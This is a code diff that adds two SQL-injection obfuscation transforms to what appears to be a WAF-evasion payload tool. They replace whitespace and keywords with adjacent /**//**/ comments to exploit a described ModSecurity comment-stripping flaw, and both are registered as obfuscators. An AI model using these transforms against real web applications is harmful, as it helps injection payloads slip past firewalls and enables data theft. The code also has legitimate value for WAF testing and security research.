@@ -31,6 +31,27 @@ def between_comment(s: str) -> str:
     return re.sub(r"\s+", "/**/", s)
 
 
+def adjacent_comment(s: str) -> str:
+    """Whitespace -> ADJACENT paired C-style comments /**//**/.
+
+    Targets ModSecurity's t:removeComments off-by-one (CVE-2026-104259): after
+    stripping the first /**/ the parser consumes the '/' that opens the next
+    comment, so the second comment survives and keyword tokens stay split for
+    the WAF, while the DB lexer still reads /**//**/ as one run of whitespace.
+    Sibling of between_comment, which inserts only a single /**/.
+    """
+    return re.sub(r"\s+", "/**//**/", s)
+
+
+def adjacent_comment_keyword(s: str) -> str:
+    """Prefix each SQL keyword with adjacent /**//**/ comments.
+
+    Covers the CVE-2026-104259 primitive where a keyword abuts a quote or digit
+    with no whitespace to replace (e.g. 1'UNION -> 1'/**//**/UNION).
+    """
+    return _replace_keywords(s, lambda kw: f"/**//**/{kw}")
+
+
 def versioned_comment(s: str) -> str:
     """MySQL version-gated comment around every keyword: SELECT -> /*!50000SELECT*/."""
     return _replace_keywords(s, lambda kw: f"/*!50000{kw}*/")
@@ -196,6 +217,11 @@ def _register() -> None:
     R = REGISTRY
     R.add("sql_between_comment", between_comment, "obfuscator",
           "collapse all whitespace into /**/ comments", classes=_SQL)
+    R.add("sql_adjacent_comment", adjacent_comment, "obfuscator",
+          "whitespace -> adjacent /**//**/ (ModSecurity t:removeComments CVE-2026-104259)",
+          classes=_SQL)
+    R.add("sql_adjacent_comment_keyword", adjacent_comment_keyword, "obfuscator",
+          "keyword -> /**//**/KEYWORD adjacent comments (CVE-2026-104259)", classes=_SQL)
     R.add("sql_versioned_comment_mysql", versioned_comment, "obfuscator",
           "MySQL /*!50000KEYWORD*/ version-gated comments", classes=_SQL)
     R.add("sql_versioned_comment_generic", versioned_comment_mssql, "obfuscator",
